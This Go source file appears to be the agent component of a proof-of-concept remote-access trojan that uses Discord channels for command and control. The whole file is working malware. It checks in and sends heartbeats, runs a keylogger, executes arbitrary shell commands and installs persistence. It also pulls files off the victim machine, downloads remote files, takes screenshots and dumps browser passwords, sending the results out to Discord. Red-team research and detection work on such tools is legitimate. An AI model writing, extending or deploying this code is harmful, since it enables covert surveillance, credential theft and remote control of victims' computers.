package main

import (
	"bytes"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"os/signal"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
	"time"

	"discord-c2-poc/cmd/agent/platforms"
	"discord-c2-poc/pkg/utils"

	"github.com/bwmarrin/discordgo"
	"github.com/joho/godotenv"
)

var (
	Token          string
	CommandChannel string
	ResultChannel  string
	KeyString      string
	EncryptionKey  []byte
	platform       platforms.Platform
)

// Load config from flags or .env
func init() {
	if Token == "" || CommandChannel == "" || ResultChannel == "" || KeyString == "" {
		_ = godotenv.Load()

		if Token == "" {
			Token = os.Getenv("DISCORD_TOKEN")
		}
		if CommandChannel == "" {
			CommandChannel = os.Getenv("COMMAND_CHANNEL_ID")
		}
		if ResultChannel == "" {
			ResultChannel = os.Getenv("RESULT_CHANNEL_ID")
		}
		if KeyString == "" {
			KeyString = os.Getenv("ENCRYPTION_KEY")
		}
	}

	if Token == "" || CommandChannel == "" || ResultChannel == "" || KeyString == "" {
		log.Fatal("Missing required configuration. Either build with -ldflags or provide .env")
	}

	if len(KeyString) != 32 {
		log.Fatal("ENCRYPTION_KEY must be exactly 32 characters long")
	}
	EncryptionKey = []byte(KeyString)
}

func main() {
	// Instantiate the platform-specific implementation
	platform = platforms.NewPlatform()
	if err := platform.Init(); err != nil {
		return // Mutex lock failed
	}

	dg, err := discordgo.New("Bot " + Token)
	if err != nil {
		log.Fatalf("error creating Discord session: %v", err)
	}

	dg.AddHandler(messageCreate)

	dg.Identify.Intents = discordgo.IntentsGuildMessages

	err = dg.Open()
	if err != nil {
		log.Fatalf("error opening connection: %v", err)
	}

	log.Println("Agent is running. Press CTRL-C to exit.")

	hostname, _ := os.Hostname()
	checkInMsg := fmt.Sprintf("[%s] Agent Online (%s)", hostname, runtime.GOOS)
	sendEncryptedChunk(dg, ResultChannel, []byte(checkInMsg), EncryptionKey)

	platform.StartKeylogger()

	// Heartbeat every 30s
	go func() {
		ticker := time.NewTicker(30 * time.Second)
		defer ticker.Stop()
		for range ticker.C {
			heartbeatMsg := fmt.Sprintf("[%s] HEARTBEAT", hostname)
			sendEncryptedChunk(dg, ResultChannel, []byte(heartbeatMsg), EncryptionKey)
		}
	}()

	sc := make(chan os.Signal, 1)
	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt)
	<-sc

	dg.Close()
}

func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
	if m.ChannelID != CommandChannel {
		return
	}

	// Simplified command parsing
	parts := strings.Fields(m.Content)
	if len(parts) == 0 {
		return
	}
	commandName := parts[0]

	// Default target is ALL
	target := "ALL"
	myHostname, _ := os.Hostname()

	// Generic command parsing for target
	// Example: !command [target] arg1 arg2
	var commandArgs string
	contentWithoutCmd := strings.TrimPrefix(m.Content, commandName)
	contentWithoutCmd = strings.TrimSpace(contentWithoutCmd)

	if strings.HasPrefix(contentWithoutCmd, "[") && strings.Contains(contentWithoutCmd, "]") {
		endIndex := strings.Index(contentWithoutCmd, "]")
		target = contentWithoutCmd[1:endIndex]
		commandArgs = strings.TrimSpace(contentWithoutCmd[endIndex+1:])
	} else {
		commandArgs = contentWithoutCmd
	}

	if target != "ALL" && target != myHostname {
		return
	}

	switch commandName {
	case "!exec":
		log.Printf("[*] Executing command: %s", commandArgs)
		var output []byte
		var err error

		if strings.HasPrefix(commandArgs, "cd ") {
			newDir := strings.TrimSpace(strings.TrimPrefix(commandArgs, "cd "))
			err = os.Chdir(newDir)
			if err != nil {
				output = []byte(fmt.Sprintf("Error changing directory: %v", err))
			} else {
				wd, _ := os.Getwd()
				output = []byte(fmt.Sprintf("Changed directory to: %s", wd))
			}
		} else {
			output, err = platform.ExecuteCommand(commandArgs) // Using platform interface
			if err != nil {
				output = []byte(fmt.Sprintf("Error executing command: %v", err))
			}
		}

		hostname, _ := os.Hostname()
		fullOutput := append([]byte(fmt.Sprintf("[%s]\n", hostname)), output...)
		sendChunkedMessage(s, ResultChannel, fullOutput)

	case "!persist":
		log.Println("[*] Installing persistence...")
		msg, err := platform.InstallPersistence() // Using platform interface
		if err != nil {
			msg = fmt.Sprintf("Persistence failed: %v", err)
		}

		output := []byte(fmt.Sprintf("[%s] %s", myHostname, msg))
		sendEncryptedChunk(s, ResultChannel, output, EncryptionKey)

	case "!download":
		path := commandArgs
		log.Printf("[*] Uploading file to Discord: %s", path)

		file, err := os.Open(path)
		if err != nil {
			sendEncryptedChunk(s, ResultChannel, []byte(fmt.Sprintf("[%s] Error opening file: %v", myHostname, err)), EncryptionKey)
			return
		}
		defer file.Close()

		originalName := filepath.Base(path)
		prefixedName := fmt.Sprintf("%s_%s", myHostname, originalName)

		_, err = s.ChannelFileSend(ResultChannel, prefixedName, file)
		if err != nil {
			sendEncryptedChunk(s, ResultChannel, []byte(fmt.Sprintf("[%s] Error sending file: %v", myHostname, err)), EncryptionKey)
		}

	case "!upload":
		url := commandArgs
		if url != "" && (strings.HasPrefix(url, "http://") || strings.HasPrefix(url, "https://")) {
			log.Printf("[*] Downloading from URL: %s", url)
			resp, err := http.Get(url)
			if err != nil {
				sendEncryptedChunk(s, ResultChannel, []byte(fmt.Sprintf("[%s] Error downloading: %v", myHostname, err)), EncryptionKey)
				return
			}
			defer resp.Body.Close()

			filename := filepath.Base(url)
			out, err := os.Create(filename)
			if err != nil {
				sendEncryptedChunk(s, ResultChannel, []byte(fmt.Sprintf("[%s] Error creating file: %v", myHostname, err)), EncryptionKey)
				return
			}
			defer out.Close()

			_, err = io.Copy(out, resp.Body)
			if err != nil {
				sendEncryptedChunk(s, ResultChannel, []byte(fmt.Sprintf("[%s] Error saving file: %v", myHostname, err)), EncryptionKey)
				return
			}
			sendEncryptedChunk(s, ResultChannel, []byte(fmt.Sprintf("[%s] File downloaded: %s", myHostname, filename)), EncryptionKey)
			return
		}

		if len(m.Attachments) > 0 {
			for _, att := range m.Attachments {
				log.Printf("[*] Downloading attachment: %s", att.Filename)
				resp, err := http.Get(att.URL)
				if err != nil {
					sendEncryptedChunk(s, ResultChannel, []byte(fmt.Sprintf("[%s] Error downloading attachment: %v", myHostname, err)), EncryptionKey)
					continue
				}
				defer resp.Body.Close()

				out, err := os.Create(att.Filename)
				if err != nil {
					sendEncryptedChunk(s, ResultChannel, []byte(fmt.Sprintf("[%s] Error creating file: %v", myHostname, err)), EncryptionKey)
					continue
				}
				defer out.Close()

				_, err = io.Copy(out, resp.Body)
				if err != nil {
					sendEncryptedChunk(s, ResultChannel, []byte(fmt.Sprintf("[%s] Error saving file: %v", myHostname, err)), EncryptionKey)
					continue
				}
				sendEncryptedChunk(s, ResultChannel, []byte(fmt.Sprintf("[%s] Attachment saved: %s", myHostname, att.Filename)), EncryptionKey)
			}
		}

	case "!screenshot":
		log.Println("[*] Taking screenshot...")
		imgBytes, err := platform.Screenshot()
		if err != nil {
			log.Printf("Error capturing screen: %v", err)
			sendEncryptedChunk(s, ResultChannel, []byte(fmt.Sprintf("[%s] Error capturing screen: %v", myHostname, err)), EncryptionKey)
			return
		}

		fileName := fmt.Sprintf("screenshot_%s.png", myHostname)
		_, err = s.ChannelFileSend(ResultChannel, fileName, bytes.NewReader(imgBytes))
		if err != nil {
			log.Printf("Error sending screenshot: %v", err)
		}

	case "!keys":
		logs := platform.GetKeylogs()
		if logs == "" {
			sendEncryptedChunk(s, ResultChannel, []byte(fmt.Sprintf("[%s] No keystrokes recorded.", myHostname)), EncryptionKey)
		} else {
			sendEncryptedChunk(s, ResultChannel, []byte(fmt.Sprintf("[%s] Keystrokes:\n%s", myHostname, logs)), EncryptionKey)
		}

	case "!dumppass":
		log.Println("[*] Dumping passwords...")
		passwords := platform.DumpBrowsers()

		if len(passwords) > 0 {
			reader := strings.NewReader(passwords)
			fileName := fmt.Sprintf("passwords_%s.txt", myHostname)
			_, err := s.ChannelFileSend(ResultChannel, fileName, reader)
			if err != nil {
				sendEncryptedChunk(s, ResultChannel, []byte(fmt.Sprintf("[%s] Error sending passwords: %v", myHostname, err)), EncryptionKey)
			}
		} else {
			sendEncryptedChunk(s, ResultChannel, []byte(fmt.Sprintf("[%s] No passwords found.", myHostname)), EncryptionKey)
		}
	}
}

func sendChunkedMessage(s *discordgo.Session, channelID string, data []byte) {
	const maxChunkSize = 1400 // Keep it safe for encryption overhead

	if len(data) <= maxChunkSize {
		sendEncryptedChunk(s, channelID, data, EncryptionKey)
	} else {
		for i := 0; i < len(data); i += maxChunkSize {
			end := i + maxChunkSize
			if end > len(data) {
				end = len(data)
			}
			chunk := data[i:end]
			sendEncryptedChunk(s, channelID, chunk, EncryptionKey)
		}
	}
}

func sendEncryptedChunk(s *discordgo.Session, channelID string, data []byte, key []byte) {
	encryptedOutput, err := utils.Encrypt(data, key)
	if err != nil {
		log.Printf("Error encrypting chunk: %v", err)
		return
	}

	_, err = s.ChannelMessageSend(channelID, encryptedOutput)
	if err != nil {
		log.Printf("Error sending chunk: %v", err)
	}
}
